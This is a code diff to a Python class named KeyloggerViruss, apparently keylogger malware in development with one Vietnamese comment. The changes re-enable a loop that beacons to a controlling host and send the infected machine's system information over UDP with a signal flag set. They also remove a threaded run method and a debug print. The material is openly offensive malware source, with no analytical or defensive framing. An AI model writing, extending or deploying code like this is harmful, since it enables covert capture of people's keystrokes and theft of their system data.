@@ -21,7 +21,6 @@ class KeyloggerViruss():
         self.host = host
         self.ip_self = get_all_local_ips(target_ip=IP)[0]['ip']
         self.info_self = get_system_info(target_ip=IP)
-        print(self.info_self)
         self.port_listen = port_listen
         self.port_send = port_send
         self.FLAG_ACTIVE = False
@@ -81,7 +80,7 @@ class KeyloggerViruss():
 
     def start_session(self):
         # self.start_monitor()
-        self.send_udp_message(message=self.info_self, signal=False)
+        self.send_udp_message(message=self.info_self, signal=True)
 
 
     def run_keylogger(self, buffer_size: int = 4096):
@@ -95,10 +94,10 @@ class KeyloggerViruss():
         try:
             while True:
                 try:
-                    # if not self.is_active_server:
-                    #     self.start_session()
-                    #     print(self.ip_self)
-                    #     time.sleep(0.1)
+                    if not self.is_active_server:
+                        self.start_session()
+                        print(self.ip_self)
+                        time.sleep(0.1)
 
                     try:
                         data, _ = sock.recvfrom(buffer_size)
@@ -127,14 +126,3 @@ class KeyloggerViruss():
         finally:
             sock.close()
             print("Socket closed. Bye.")
-
-    def run(self):
-        # tạo thread gửi riêng
-        import threading
-        run_keylogger_thread = threading.Thread(target=self.run_keylogger, daemon=True)
-        run_keylogger_thread.start()
-
-        while not self.is_active_server:
-            self.start_session()
-            print(self.ip_self)
-            time.sleep(1)
